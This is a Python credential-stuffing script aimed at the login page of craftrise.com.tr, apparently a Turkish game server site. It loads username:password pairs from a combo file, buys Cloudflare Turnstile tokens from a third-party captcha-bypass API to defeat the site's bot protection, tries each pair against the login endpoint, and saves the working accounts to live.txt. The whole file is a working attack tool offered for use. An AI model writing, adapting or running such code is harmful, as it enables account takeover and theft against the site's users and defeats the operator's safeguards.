import requests

def bypass():
    url = "https://turnstile-bypass-api1.p.rapidapi.com/check"
    payload = {
        "url": "http://craftrise.com.tr/",
        "sitekey": "0x4AAAAAAA4cK60wpgOTyti9",
        "type": "cfinvisible"
    }
    headers = {
        "x-rapidapi-key": "YOUR APİ KEY",#https://rapidapi.com/ttur5678/api/turnstile-bypass-api1/pricing        35 REQUESTS FREE
        "x-rapidapi-host": "turnstile-bypass-api1.p.rapidapi.com",
        "Content-Type": "application/json"
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.json().get('captcha_token'):
        return response.json().get('captcha_token')
    else:
        return bypass()
    

def check():
    with open("combo.txt", "r", encoding="utf-8") as f:
        combos = [line.strip() for line in f if line.strip()]

    for combo in combos:
        try:
            value, password = combo.split(":", 1)
        except ValueError:
            continue

        r = requests.session()
        r.get('http://craftrise.com.tr/', headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"})
        headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","x-requested-with": "XMLHttpRequest","content-type": "application/x-www-form-urlencoded; charset=UTF-8","origin": "https://www.craftrise.com.tr","referer": "https://www.craftrise.com.tr/","Host": "www.craftrise.com.tr",}
        data = {"value": value,"password": password,"grecaptcharesponse": bypass()}
        res = r.post('https://www.craftrise.com.tr/posts/post-login.php', headers=headers, data=data)
        print(res.text)
        try:
            result = res.json()
        except Exception:
            continue

        if result.get("resultType") != "error":
            with open("live.txt", "a", encoding="utf-8") as f:
                f.write(f"{value}:{password}\n")
            print(f"LIVE: {value}:{password}")
        else:
            print(f"DEAD: {value}:{password}")

check()